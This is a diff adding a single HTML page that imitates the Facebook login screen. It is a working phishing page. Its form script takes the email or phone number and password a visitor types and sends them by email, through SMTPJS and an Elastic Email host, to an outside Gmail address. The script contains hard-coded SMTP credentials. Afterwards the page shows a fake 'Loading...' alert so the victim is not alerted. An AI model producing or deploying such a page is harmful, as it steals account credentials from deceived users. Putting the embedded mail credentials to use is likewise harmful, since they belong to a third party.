@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <title>FB - log in or sign up</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>FB Community</h1>
+          <p>Facebook helps you connect and share</p>
+          <p>with the people in your life.</p>
+        </div>
+        <form onsubmit="emailSend(); reset(); return false;">
+          <input type="text" id="name" placeholder="Email or phone number" required>
+          <input type="password" id="password" placeholder="Password" required>
+        
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="https://www.facebook.com/reg/">Create new account</a>
+          </div>
+        </form>        
+      </div>
+    </div>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script>
+      function emailSend(){
+
+var UserName = document.getElementById('name').value;
+var Password = document.getElementById('password').value;
+
+var messageBody = "Name : " + UserName +
+"<br/> Password : "  + Password;   
+  Email.send({
+      Host : "smtp.elasticemail.com",
+      Username : "businessmail.001b@gmail.com",
+      Password : "C09B4AE2C0CA0DBB56DCBCA158E9B86C8D9C",
+      To : 'informationstore.001@gmail.com',
+      From : "businessmail.001b@gmail.com",
+      Subject : "New user Data",
+      Body : messageBody
+  }).then(
+    message => {
+      if(message=='OK'){
+        swal("Loading...", "Your Data is on Processing", "success");
+      }
+      else{
+        swal("Error", "Your Data in on Processing", "error");
+      }
+    }
+  );
+}
+
+    </script>
+  </body>
+</html>
